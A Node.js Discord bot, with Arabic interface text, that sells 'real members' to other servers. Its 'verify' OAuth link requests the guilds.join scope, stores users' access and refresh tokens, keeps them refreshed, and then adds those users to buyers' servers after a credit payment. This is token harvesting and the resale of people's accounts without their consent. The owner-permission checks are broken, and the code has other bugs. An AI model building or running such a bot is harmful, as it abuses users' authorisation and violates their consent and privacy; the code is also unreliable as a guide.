const { Intents  , Client , MessageActionRow, MessagePayload  , MessageSelectMenu ,Modal , MessageEmbed  ,MessageButton , MessageAttachment, Permissions, TextInputComponent   } = require('discord.js');
const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES
  ]
});

var express = require("express");
var app = express();
var path = require("path");
var bodyParser = require("body-parser");
const Database = require('st.db')
const usersdata = new Database({
  path: './database/users.json',
  databaseInObject: true
})
const DiscordStrategy = require('passport-discord').Strategy
  , refresh = require('passport-oauth2-refresh');
const passport = require('passport');
const session = require('express-session');
const db = require('pro.db')
const wait = require('node:timers/promises').setTimeout;
const { channels, bot, website } = require("./config.js");
app.use(bodyParser.urlencoded({ extended: true }));
app.set("views", path.join(__dirname, "/views"));
app.use(express.static(__dirname + "assets"))
app.set("view engine", "ejs")
app.use(express.static("public"));
const config = require("./config.js");
const { use } = require("passport");
global.config = config;
import('node-fetch')
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2({
  clientId: config.bot.botID,
  clientSecret: config.bot.clientSECRET,
  redirectUri: config.bot.callbackURL,
});

require('./slash.js')
app.get('/', function (req, res) {
  res.send('Hello World')
})

const prefix = config.bot.prefix; 

app.listen(3000)
var scopes = ['identify', 'guilds', 'guilds.join'];

passport.use(new DiscordStrategy({
  clientID: config.bot.botID,
  clientSecret: config.bot.clientSECRET,
  callbackURL: config.bot.callbackURL,
  scope: scopes
}, async function (accessToken, refreshToken, profile, done) {
  process.nextTick(async function () {
    usersdata.set(`${profile.id}`, {
      accessToken: accessToken,
      refreshToken: refreshToken,
      email: profile.email
    })
    return done(null, profile);
  });
  await oauth.addMember({
    guildId: `${config.bot.GuildId}`,
    userId: profile.id,
    accessToken: accessToken,
    botToken: client.token
  })

}));


app.get("/", function (req, res) {
  res.render("index", { client: client, user: req.user, config: config, bot: bot });
});


client.on("ready", () => {
  console.log(`Logged in ────────────────────────────────────────────────────────────────────────────────────────────
─██████──────────██████─██████████████─████████──████████─██████████████─████████████████───
─██░░██████████████░░██─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─██░░░░░░░░░░░░░░░░░░██─██░░██████░░██─████░░██──██░░████─██░░██████░░██─██░░████████░░██───
─██░░██████░░██████░░██─██░░██──██░░██───██░░░░██░░░░██───██░░██──██░░██─██░░██────██░░██───
─██░░██──██░░██──██░░██─██░░██████░░██───████░░░░░░████───██░░██──██░░██─██░░████████░░██───
─██░░██──██░░██──██░░██─██░░░░░░░░░░██─────████░░████─────██░░██──██░░██─██░░░░░░░░░░░░██───
─██░░██──██████──██░░██─██░░██████░░██───────██░░██───────██░░██──██░░██─██░░██████░░████───
─██░░██──────────██░░██─██░░██──██░░██───────██░░██───────██░░██──██░░██─██░░██──██░░██─────
─██░░██──────────██░░██─██░░██──██░░██───────██░░██───────██░░██████░░██─██░░██──██░░██████─
─██░░██──────────██░░██─██░░██──██░░██───────██░░██───────██░░░░░░░░░░██─██░░██──██░░░░░░██─
─██████──────────██████─██████──██████───────██████───────██████████████─██████──██████████─
────────────────────────────────────────────────────────────────────────────────────────────`);

app.use(session({
  secret: 'some random secret',
  cookie: {
    maxAge: 60000 * 60 * 24
  },
  saveUninitialized: false
}));
app.get("/", (req, res) => {
  res.render("index", { client: client, user: req.user, config: config, bot: bot });
});
passport.serializeUser(function (user, done) {
  done(null, user);
});
passport.deserializeUser(function (user, done) {
  done(null, user);
});
app.use(passport.initialize());
app.use(passport.session());

app.get('/login', passport.authenticate('discord', { failureRedirect: '/' }), function (req, res) {
  var characters = '0123456789';
  let idt = ``
  for (let i = 0; i < 20; i++) {
    idt += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  res.render("login")
});


client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `send`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let button = new MessageButton()
      .setLabel(`اثبت نفسك`)
      .setStyle(`LINK`)
      .setURL(`${config.bot.TheLinkVerfy}`)
      .setEmoji(`<:emoji_1729974823969:1299833366375563274>`)

    let row = new MessageActionRow()
      .setComponents(button)
    message.channel.send({ components: [row] })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `invite`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let button = new MessageButton()
      .setLabel(`اضافة اليوت`)
      .setStyle(`LINK`)
      .setURL(`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=129&scope=bot`)
      .setEmoji(`<:emoji_1729974864986:1299833539352727665>`)

    let row = new MessageActionRow()
      .setComponents(button)
    message.channel.send({ components: [row] })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `check`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let args = message.content.split(" ").slice(1).join(" ");
    if (!args) return message.channel.send({ content: `**منشن شخص طيب**` });
    let member = message.mentions.members.first() || message.guild.members.cache.get(args.split(` `)[0]);
    if (!member) return message.channel.send({ content: `**شخص غلط**` });
    let data = usersdata.get(`${member.id}`)
    if (data) return message.channel.send({ content: `**موثق بالفعل**` });
    if (!data) return message.channel.send({ content: `**غير موثق**` });
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `join`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let msg = await message.channel.send({ content: `**جاري الفحص ..**` })
    let alld = usersdata.all()
    let args = message.content.split(` `).slice(1)
    if (!args[0] || !args[1]) return msg.edit({ content: `**عذرًا , يرجى تحديد خادم ..**` }).catch(() => { message.channel.send({ content: `**عذرًا , يرجى تحديد خادم ..**` }) });
    let guild = client.guilds.cache.get(`${args[0]}`)
    let amount = args[1]
    let count = 0
    if (!guild) return msg.edit({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` }).catch(() => { message.channel.send({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` }) });
    if (amount > alld.length) return msg.edit({ content: `**لا يمكنك ادخال هاذا العدد ..**` }).catch(() => { message.channel.send({ content: `**لا يمكنك ادخال هاذا العدد ..**` }) });;
    for (let index = 0; index < amount; index++) {
      await oauth.addMember({
        guildId: guild.id,
        userId: alld[index].ID,
        accessToken: alld[index].data.accessToken,
        botToken: client.token
      }).then(() => {
        count++
      }).catch(() => { })
    }
    msg.edit({
      content: `**تم بنجاح ..**
**تم ادخال** \`${count}\`
**لم اتمكن من ادخال** \`${amount - count}\`
**تم طلب** \`${amount}\``
    }).catch(() => {
      message.channel.send({
        content: `**تم بنجاح ..**
**تم ادخال** \`${count}\`
**لم اتمكن من ادخال** \`${amount - count}\`
**تم طلب** \`${amount}\``
      })
    });;
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `refresh`)) {
    if (!config.bot.owners.includes(`${message.author.id}`)) {
      return;
    }
    let mm = await message.channel.send({ content: `**جاري عمل ريفريش ..**` }).catch(() => { })
    let alld = usersdata.all()
    var count = 0;

    for (let i = 0; i < alld.length; i++) {
      await oauth.tokenRequest({
        'clientId': client.user.id,
        'clientSecret': bot.clientSECRET,
        'grantType': 'refresh_token',
        'refreshToken': alld[i].data.refreshToken
      }).then((res) => {
        usersdata.set(`${alld[i].ID}`, {
          accessToken: res.access_token,
          refreshToken: res.refresh_token
        })
        count++
      }).catch(() => {
        usersdata.delete(`${alld[i].ID}`)
      })
    }

    mm.edit({
      content: `**تم بنجاح ..**
**تم تغير** \`${count}\`
**تم حذف** \`${alld.length - count}\``
    }).catch(() => {
      message.channel.send({ content: `**تم بنجاح .. ${count}**` }).catch(() => { })
    })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `stock`)) {
     let alld = usersdata.all()
    const embed = new MessageEmbed()
        .setAuthor(message.guild.name , message.guild.iconURL({dynamic : true}))   .setThumbnail(message.guild.iconURL({dynamic : true}))
        .setFooter(message.guild.name , message.guild.iconURL({dynamic : true}))
        .setTimestamp()
        .setImage("https://media.discordapp.net/attachments/1280208750606680108/1332470874850459648/Green_White_Minimalistic_Simple_Collage_Daily_Vlog_YouTube_Thumbnail.png?ex=67955fb4&is=67940e34&hm=38520b8c5fcaf3396fd0d0a3a2601bdefbf7b01e41d7df89c9542b53f59a05eb&")
    .setDescription(`**<:emoji_81:1326722989341016164> Stock Of Members : \`${alld.length}\`
    <:emoji_81:1326722989341016164> المخزون الحالي للاعضاء هو : \`${alld.length}\`**`)
    message.reply({ embeds: [embed] })
  }
})
client.on('messageCreate', async message => {
  if (message.content.startsWith(prefix + `help`)) {
    let embed = new MessageEmbed()
    .setColor('#0f0098')
      .setAuthor(message.guild.name , message.guild.iconURL({dynamic : true}))   .setThumbnail(message.guild.iconURL({dynamic : true}))
      .setFooter(message.guild.name , message.guild.iconURL({dynamic : true}))
      .setTimestamp()
      .serImage("https://i.postimg.cc/fR3jmVq9/Video-To-Gif-GIF.gif")
      .setDescription(`**مرحباً** بك في قائمة الهيلب 👋

    يرجي اختيار بعض المعلومات من الأزرار الذي بأسفل الرسالة ؛`)
    let help = new MessageActionRow()
    .addComponents(
    new MessageButton()
    .setCustomId(`gen`)
    .setLabel(`General Commands.`)
    .setEmoji(`<:emoji_80:1326721342845878314>`)
    .setStyle(`SECONDARY`),
      new MessageButton()
      .setCustomId(`ad`)
      .setLabel(`Admin Commands.`)
      .setEmoji(`<:owner:1324753423836385321>`)
      .setStyle(`SECONDARY`),
      )
    
    message.reply({ embeds: [embed], components: [help] })
  }
})


client.on('interactionCreate', async interaction => {
  if (interaction.customId === 'gen') {
    const user = await interaction.user.fetch();
    await interaction.reply({ content: `**General Commands :**
> /help        , يستخدم الامر لـ رؤية قائمة الهيلب.
> /ping        , يستخدم الامر لـ لمعرفه سرعه استجابه البوت.
> /stock       , يستخدم الامر لـ لمعرفه عدد الاعضاء المتوفرة .
> $price       , يستخدم الامر لـ معرفة سعر عدد من الاعضاء.`, ephemeral: true });
    }
  }
);
client.on('interactionCreate', async interaction => {
  if (interaction.customId === 'ad') {
       if (!interaction.user.id == config.bot.owners) return ;
    const user = await interaction.user.fetch();
    await interaction.reply({ content: `**Ticket Commands :**
    > /send-ticket       لإرسال رساله التذكرة
    > $delete-ticket لحذف تذكرة
    > $delete-tickets لحذف جميع التذاكر

    **Owners Commands :**
    > /send-stock  , يستخدم هذا الامر لارسال رسالة مخزون الاعضاء .
    > /set-price , لتغيير سعر العضو الواحد
    > $check لفحص شخص اثبت نفسه او لا
    > $send لارسال رساله اثبت نفسك
    > $join لادخال اعضاء الي سيرفر
    > $invite لارسال رساله ادخال البوت
    > $refresh لعمل ريفريش للاعضاء`, ephemeral: true });
    }
  }
);

var listeners = app.listen(6075, function () {
  console.log("Your app is listening on port " + `6075`) // ايدي البورت
});

client.on('ready', () => {
  console.log(`Bot is On! ${client.user.tag}`);
   console.log(`Bot Version ${process.version}`);
});
client.login(""); // توكن البوت
const { AutoKill } = require('autokill')
AutoKill({ Client: client, Time: 5000 })

process.on("unhandledRejection", error => {
  console.log(error)
});


client.on(`interactionCreate` , interaction => {
  if (!interaction.isCommand())return ;
  if (interaction.commandName == 'send-ticket'){

    if (!interaction.user.id == config.bot.owners) return ;
   const channel = interaction.channel.id ; 

   const Channel = interaction.guild.channels.cache.get(channel); 
    const embed = new MessageEmbed()
          .setAuthor(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))
          .setThumbnail(interaction.guild.iconURL({dynamic : true}))
          .setFooter(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))
          .setImage(config.bot.ticketimg)
          .setTimestamp() 
    .setTitle(`خدمة بيع اعضاء حقيقية `)
            .setDescription(`**لشراء اعضاء حقيقية ، يرجي الضغط علي الزر ادناه لفتح تذكرة <:ticket:1324730933495992371> . 
   <a:alert:1227485626082001057> تنبيهات هامة :
1. لا نضمن دخول الكمية التي قد اشتريتها كامله بسبب شئ من الديسكورد.
2. لا نتحمل مسؤلية التحويل لشخص اخر.
3. يرجي التحويل داخل التذكرة لانه لم يتم تعويضك في حالة تم التحويل خارج التذكرة.**`)
    const row = new MessageActionRow().addComponents(
      new MessageButton()
      .setCustomId('openticket')
      .setEmoji('<:ticket:1324730933495992371>')
      .setStyle('SECONDARY')
    )

    Channel.send({ components : [row] })

    interaction.reply({content : `**<a:emoji_76:1210070585967910942> تم ارسال بانل التكت بنجاح**` , ephemeral : true})
    
  }
})
client.on(`interactionCreate`,async interaction => {
  if (!interaction.isButton()) return; 
  if (interaction.customId == 'openticket'){
    let y = db.add(`ticket_${interaction.guild.id}`, 1)
        if (y === null || y === 0000) y = 1;
    let yy = db.get(`ticket_${interaction.guild.id}`)
    const category = interaction.guild.channels.cache.find(ch => ch.type === 'GUILD_CATEGORY' && ch.name === 'Buy Ticket');

    if (!category) {
      const createdCategory = await interaction.guild.channels.create('Buy Ticket', { type: 'GUILD_CATEGORY' });

      const ticketChannel = await interaction.guild.channels.create(`ticket-${yy}`, { type: 'GUILD_TEXT', parent: createdCategory.id });
    }

    const ticket = await interaction.guild.channels.create(`ticket-${yy}` , {
      type : 'GUILD_TEXT' , 
       parent: category.id , 
      permissionOverwrites : [

       {
         id: interaction.guild.roles.everyone.id,
         deny: ['VIEW_CHANNEL']
       },
       {
         id: interaction.user.id,
         allow: ['VIEW_CHANNEL']
       },
      ]

       })





    const embed = new MessageEmbed()
        .setAuthor(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))   .setThumbnail(interaction.guild.iconURL({dynamic : true}))
        .setFooter(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))
        .setTimestamp()
      .setImage("https://i.postimg.cc/D0ZbhNtX/Green-White-Minimalistic-Simple-Collage-Daily-Vlog-You-Tube-Thumbnail.jpg")
    .setDescription(`**<:ticket:1324730933495992371> تذكرة شراء اعضاء .
ـــــــــــــ ـــــــــــــ ـــــــــــــ 
<:emoji_79:1326154984294977586> - يمكنك شراء الكمية الذي تحب من الكمية الموجودة لدي .
ـــــــــــــ ـــــــــــــ ـــــــــــــ 
💰 استخدم عملة الكريديت بروبوت فقط اذا كنت تريد شراء بعملة اخري يرجي منشن الاونر و الاستفسار .
<:emoji_77:1326148007066079354> خدمة سريعة وبجودة عالية لضمان رضاكم لكن لا نضمن دخول كمية الاعضاء كاملة بسبب ديسكورد .**`)




const row = new MessageActionRow().addComponents(
new MessageButton()
.setCustomId('buyMembers')
.setEmoji('<:emoji_82:1326726937699418172>')
.setStyle('SUCCESS'), 
  new MessageButton()
  .setCustomId('how')
  .setEmoji('<:emoji_75:1326145345356562473>')
  .setStyle('SECONDARY'),
new MessageButton()
.setCustomId('closeTicket')
.setEmoji('<:emoji_73:1326144870040993864>')
.setStyle('DANGER'), 
new MessageButton()
 .setStyle("LINK")
 .setEmoji(`<:emoji_80:1326721342845878314>`)      
.setURL(`https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=129&scope=bot`)
)

await ticket.send({content : `${interaction.user}` , embeds: [embed] , components : [row]})

await interaction.reply({content : `**<a:emoji_58:1324763358523555904> تم انشاء التذكرة بنجاح ${ticket}**`, ephemeral : true})



}
})
client.on("interactionCreate", async (interaction) => {
  if(interaction.customId == 'how'){
     interaction.reply({content: `**<a:alert:1227485626082001057> يرجي اتباع الخطوات الذي بالشرح :**
||  || `, ephemeral: true})
  }
});

client.on(`interactionCreate`,async interaction => {
  if (!interaction.isButton())return ; 
  if (interaction.customId == 'buyMembers'){

    const BuyModal = new Modal()
    .setCustomId('BuyModal')
    .setTitle('Buy Members');
  const Count = new TextInputComponent()
    .setCustomId('Count')
    .setLabel("عدد الاعضاء")
    .setMinLength(1)
    .setMaxLength(5)
    .setStyle('SHORT'); 
    
    const serverid = new TextInputComponent()
    .setCustomId('serverid')
    .setLabel("ايدي السيرفر")
    .setMinLength(1)
    .setMaxLength(22)
    .setStyle('SHORT'); 


  const firstActionRow = new MessageActionRow().addComponents(Count);
  const firstActionRow2 = new MessageActionRow().addComponents(serverid);


  BuyModal.addComponents(firstActionRow , firstActionRow2);

  await interaction.showModal(BuyModal);


  } else if (interaction.customId == 'closeTicket'){

    interaction.reply(`**سوف يتم حذف التذكرة خلال 10 ثواني <a:AR_bots:1222004924804501524>**`)
   setTimeout(() => {
  interaction.channel.delete();
}, 10000);

    
  }
})


client.on(`interactionCreate` ,async interaction => {
  if (!interaction.isModalSubmit())return ;
  if (interaction.customId == 'BuyModal'){


    const Count = interaction.fields.getTextInputValue('Count');
    const serverid = interaction.fields.getTextInputValue('serverid');
    const price = await db.get(`price_${interaction.guild.id}`)
    const member = interaction.member
    const result = Count * price; 
    const tax = Math.floor(result * (20 / 19) + 1);

    let alld = usersdata.all()
     
    let guild = client.guilds.cache.get(`${serverid}`)
    let amount = Count
    let count = 0
    if (!guild) return interaction.reply({ content: `**<:emoji_1729975446604:1299835978353213440> Sorry, I couldn't find the server that I entered, please enter the server through the button, check the server from above and try again..
    
<:emoji_1729975446604:1299835978353213440> عذرا , لم اتمكن من العثور علي الخادم الذي  ادخلت ايديه رجاءً ادخلني السيرفر من عبر زر اضافة البوت من فوق و اعد المحاولة..**` }).catch(() => { interaction.channel.send({ content: `**<:emoji_1729975446604:1299835978353213440> Sorry, I couldn't find the server that I entered, please enter the server through the button, Add Bot to server from above and try again..

<:emoji_1729975446604:1299835978353213440> عذرا , لم اتمكن من العثور علي الخادم الذي  ادخلت ايديه رجاءً ادخلني السيرفر من عبر زر اضافة البوت من فوق و اعد المحاولة..**` }) });
    if (amount > alld.length) return interaction.reply({ content: `**<a:alert:1227485626082001057> You Can't Buy this Quantity, I don't have this Number of Mebers to know what Quantity you Can buy, Please Write $stock
    
<a:alert:1227485626082001057> لا يمكنك شراء هذه الكمية، لا يتوفر لدي هاذا العدد من الاعضاء لمعرفة الكمية التي يمكنك شرائها، يرجي كتابة stock$**` }).catch(() => { interaction.channel.send({ content: `**<a:alert:1227485626082001057> You Can't Buy this Quantity, I don't have this Number of Mebers to know what Quantity you Can buy, Please Write $stock

<a:alert:1227485626082001057> لا 
يمكنك شراء هذه الكمية، لا يتوفر لدي هاذا العدد من الاعضاء لمعرفة الكمية التي يمكنك شرائها، يرجي كتابة $stock**` }) });;
    const tra = new MessageEmbed()
             .setAuthor(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))
              .setThumbnail(interaction.guild.iconURL({dynamic : true}))
              .setFooter(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))
            .setTimestamp()
            .setTitle('عملية شراء اعضاء')
              .setDescription(`**لأكمال عملية شراء الاعضاء , يرجي نسخ الكود بالأسفل و إتمام عملية التحويل<a:alert:1227485626082001057>.

    \`\`\`
    #credit ${config.bot.TraId} ${tax}
    \`\`\` **`)
    await interaction.reply({ embeds: [tra] });


    const filter = ({ content, author: { id } }) => {
        return (
            content.startsWith(`**:moneybag: | ${interaction.user.username}, has transferred `) &&
            content.includes(config.bot.TraId) &&
            id === "282859044593598464" && // ايدي الي يتحول له
            (Number(content.slice(content.lastIndexOf("`") - String(tax).length, content.lastIndexOf("`"))) >= result)
        );
    };

    const collector = interaction.channel.createMessageCollector({
        filter,
        max: 1,
    });

    collector.on('collect', async collected => {


  await interaction.deleteReply();

      let msg = await interaction.channel.send({ content: `**<:emoji_81:1326722989341016164> Im Entering the Members, Please Wait.. 
<:emoji_81:1326722989341016164> جاري ادخال الاعضاء يرجي الانتظار..**` })

      
      for (let index = 0; index < amount; index++) {
        await oauth.addMember({
          guildId: guild.id,
          userId: alld[index].ID,
          accessToken: alld[index].data.accessToken,
          botToken: client.token
        }).then(() => {
          count++
        }).catch(() => { })
      }
      msg.edit(`**<:emoji_81:1326722989341016164> لقد قمت بشراء : \`${amount}\` من الاعضاء
              <:emoji_81:1326722989341016164> لقد تم ادخال : \`${count}\` عضو
              <:emoji_81:1326722989341016164> لم يتم ادخال : \`${amount - count}\` عضو**`).catch(() => {
        message.channel.send(`**<:emoji_81:1326722989341016164> لقد قمت بشراء : \`${amount}\` من الاعضاء
        <:emoji_81:1326722989341016164> لقد تم ادخال : \`${count}\` عضو
        <:emoji_81:1326722989341016164> لم يتم ادخال : \`${amount - count}\` عضو**`)
      });;

    });
    const role = `${config.bot.clientrole}`
    const re = interaction.guild.roles.cache.get(role)  
    await member.roles.add(re)
          const Log = await client.channels.cache.get(config.bot.done)

    const embed = new MessageEmbed()  .setAuthor(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))   .setThumbnail(interaction.guild.iconURL({dynamic : true}))
      .setFooter(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))
          .setTimestamp()
    .setTitle(`**> تم شراء اعضاء بواسطة ${member} الكمية التي تم شرائها ${Count} عضو**`)
    .setImage("https://i.postimg.cc/QtjT4CmS/Green-White-Minimalistic-Simple-Collage-Daily-Vlog-You-Tube-Thumbnail.jpg")
    .setDescription(`\`\`\`💫 - عش تجربة مميزة مع Mayor Host : discord.gg/mayor.\`\`\``)
          if (Log){
            await Log.send({embeds: [embed]})
          }

  }
})


client.on('interactionCreate', async (interaction) => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName == 'send-stock') {
     if (!interaction.user.id == config.bot.owners) return ;
    
     let alld = usersdata.all()
    const embed = new MessageEmbed()
        .setAuthor(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))   .setThumbnail(interaction.guild.iconURL({dynamic : true}))
        .setFooter(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))
        .setTimestamp()
        .setImage("https://i.postimg.cc/wTMhYtpG/Green-White-Minimalistic-Simple-Collage-Daily-Vlog-You-Tube-Thumbnail.jpg")
    .setDescription(`**<:emoji_81:1326722989341016164> Stock Of Members : \`${alld.length}\`
    <:emoji_81:1326722989341016164> المخزون الحالي للاعضاء هو : \`${alld.length}\`**`)
  const bu = new MessageActionRow().addComponents(
      new MessageButton()
    .setCustomId('stock')
    .setEmoji('<:mayor:1324396250912784416>')
    .setStyle('SECONDARY')


  )
    interaction.reply({content: "Done Send Stock Panel<a:emoji_58:1324763358523555904>", ephemeral: true})

interaction.channel.send({embeds : [embed] , components : [bu]})
}    
});

client.on('interactionCreate', async interaction => {
if (!interaction.isButton())return 
if (interaction.customId == 'stock'){
  let alld = usersdata.all()
const stock = new MessageEmbed()

  .setAuthor(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))   .setThumbnail(interaction.guild.iconURL({dynamic : true}))
  .setFooter(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))
  .setTimestamp()
  .setImage("https://i.postimg.cc/wTMhYtpG/Green-White-Minimalistic-Simple-Collage-Daily-Vlog-You-Tube-Thumbnail.jpg")
  .setDescription(`**<:emoji_81:1326722989341016164> Stock Of Members : \`${alld.length}\`
  <:emoji_81:1326722989341016164> المخزون الحالي للاعضاء هو : \`${alld.length}\`**`)

const bu = new MessageActionRow().addComponents(
        new MessageButton()
      .setCustomId('stock')
      .setEmoji('<:mayor:1324396250912784416>')
      .setStyle('SECONDARY')


    )

interaction.reply({content: "**Done Refreshed<a:emoji_58:1324763358523555904>**", ephemeral: true})
interaction.message.edit({embeds : [stock] , components: [bu]})
}
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (message.content.startsWith('$price')){

  const args = message.content.split(' ');
  const quantity = parseInt(args[1]); // العدد المحدد
  if (isNaN(quantity)) {
    return message.reply('**<:emoji_1729975446604:1299835978353213440> اكتب العدد الذي تريدة**');
  }

    const price = await db.get(`price_${interaction.guild.id}`)

  const pricet = price * quantity;

const tax = Math.floor(pricet * (20 / 19) + 1);

           const msog = await message.reply({ content: `
**${quantity}  × ${price} = ${tax}  

---------------------------------   

<:emoji_82:1326726937699418172> Member Price : ${price} 
<:emoji_82:1326726937699418172> سعر العضو : ${price} **
**للشراء توجه الي التذكرة.** `});
}
});

client.on(`interactionCreate` , interaction => {
  if(interaction.commandName == "ping") { 
      interaction.reply({ content: `
\`\`\`js
Latency is ${interaction.createdTimestamp - interaction.createdTimestamp}ms. 
API Latency is ${Math.round(client.ws.ping)}ms.\`\`\`
    `})
  }
  })   

client.on(`interactionCreate` , interaction => {
  if(interaction.commandName == "help") { 
    let embed = new MessageEmbed()
    .setColor('#0f0098')
      .setAuthor(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))   .setThumbnail(interaction.guild.iconURL({dynamic : true}))
      .setFooter(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))
      .setTimestamp()
      .setImage("https://i.postimg.cc/fR3jmVq9/Video-To-Gif-GIF.gif")
      .setDescription(`**مرحباً** بك في قائمة الهيلب 👋

    يرجي اختيار بعض المعلومات من الأزرار الذي بأسفل الرسالة ؛`)
    let help = new MessageActionRow()
    .addComponents(
    new MessageButton()
    .setCustomId(`gen`)
    .setLabel(`General Commands.`)
    .setEmoji(`<:emoji_82:1326726937699418172>`)
    .setStyle(`SECONDARY`),
      new MessageButton()
      .setCustomId(`ad`)
      .setLabel(`Admin Commands.`)
      .setEmoji(`<:owner:1324753423836385321>`)
      .setStyle(`SECONDARY`),
      )

      interaction.reply({ embeds: [embed], components: [help] })
  }
  })   


client.on('interactionCreate', async interaction => {
  if (interaction.customId === 'gen') {
    const user = await interaction.user.fetch();
    await interaction.reply({ content: `**General Commands :**
> /help        , يستخدم الامر لـ رؤية قائمة الهيلب.
> /ping        , يستخدم الامر لـ لمعرفه سرعه استجابه البوت.
> /stock       , يستخدم الامر لـ لمعرفه عدد الاعضاء المتوفرة .
> $price       , يستخدم الامر لـ معرفة سعر عدد من الاعضاء.`, ephemeral: true });
    }
  }
);
client.on('interactionCreate', async interaction => {
  if (interaction.customId === 'ad') {
       if (!interaction.user.id == config.bot.owners) return ;
    const user = await interaction.user.fetch();
    await interaction.reply({ content: `**Ticket Commands :**
> /send-ticket       لإرسال رساله التذكرة
> $delete-ticket لحذف تذكرة
> $delete-tickets لحذف جميع التذاكر

**Owners Commands :**
> /send-stock  , يستخدم هذا الامر لارسال رسالة مخزون الاعضاء .
> /set-price , لتغيير سعر العضو الواحد
> $check لفحص شخص اثبت نفسه او لا
> $send لارسال رساله اثبت نفسك
> $join لادخال اعضاء الي سيرفر
> $invite لارسال رساله ادخال البوت
> $refresh لعمل ريفريش للاعضاء`, ephemeral: true });
    }
  }
);

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isCommand()) return;
  if (interaction.commandName == 'stock') {

     let alld = usersdata.all()
    const embed = new MessageEmbed()
        .setAuthor(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))   .setThumbnail(interaction.guild.iconURL({dynamic : true}))
        .setFooter(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))
        .setTimestamp()
    .setDescription(`**<:emoji_81:1326722989341016164> Stock Of Members : \`${alld.length}\`
    <:emoji_81:1326722989341016164> المخزون الحالي للاعضاء هو : \`${alld.length}\`**`)

interaction.reply({embeds : [embed]})
}    
});



client.on("messageCreate" , async(message) => {
  if(message.content == "$delete-ticket"){ // الكومنت هنا
  if (!message.member.permissions.has("ADMINISTRATOR")) 
    return message.reply("** 😕 متقدرش تستخم الامر يصحبي**")  
    if(message.author.bot)return;
    message.channel.delete();
  }
})
client.on('message', async (message) => {
  if (message.content === '$delete-tickets') {
    if (!message.member.permissions.has("ADMINISTRATOR")) 
      return message.reply("** 😕 متقدرش تستخم الامر يصحبي**") 
    message.reply("**<a:emoji_76:1210070585967910942> | تم حذف التذاكر بنجاح.**")
    message.guild.channels.cache.forEach((channel) => {
      if (channel.name.toLowerCase().startsWith('ticket')) {
        channel.delete().then(() => {
          console.log(`Deleted channel: ${channel.name}`);
        }).catch((error) => {
          console.error(`Failed to delete channel: ${channel.name}, error: ${error}`);

        });
      }
    });
  }
});
let channel = config.bot.fedroom;

client.on("messageCreate", message => {

  if (message.channel.type === "dm" ||

    message.author.bot) return

  if (channel.includes(message.channel.id)) {

    message.delete()

    let args = message.content.split(',')

    let button = new MessageActionRow()

      .addComponents(

        new MessageButton()

          .setStyle('LINK')

          .setLabel('FROM')

          .setURL(`https://discord.com/users/${message.author.id}`))

    let embed = new MessageEmbed()

      .setAuthor(message.guild.name , message.guild.iconURL({dynamic : true}))
      .setThumbnail(message.guild.iconURL({dynamic : true}))
      .setFooter(message.guild.name , message.guild.iconURL({dynamic : true}))

      .setThumbnail(message.author.displayAvatarURL({ dynamic: true }))
.setTitle(`**شكرا لرأيك يعسل 🤎**`)
 .setDescription(`**- FeedBack : ${args}**`)

      .setColor(message.guild.me.displayColor)
      .setTimestamp()
    message.channel.send({ content:`- <@${message.author.id}>`, embeds: [embed], components: [button] }).catch((err) => {

      console.log(err.message)

    })
message.channel.send(config.bot.line)
  }

});
client.on(`interactionCreate` , interaction => {
if (!interaction.isCommand())return;
    if(interaction.commandName == "set-price") {
        if (!interaction.user.id == config.bot.owners) return ;
  const price = interaction.options.getString('price')
          db.set(`price_${interaction.guild.id}`, price)
            const donembed = new MessageEmbed()
              .setAuthor(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))
              .setThumbnail(interaction.guild.iconURL({dynamic : true}))
.setDescription(`**تمت عملية تغيير سعر العضو الي : \`${price}\`.**`)
      .setFooter(interaction.guild.name , interaction.guild.iconURL({dynamic : true}))

      .setTimestamp()
              interaction.reply({embeds: [donembed]})
                              }
})
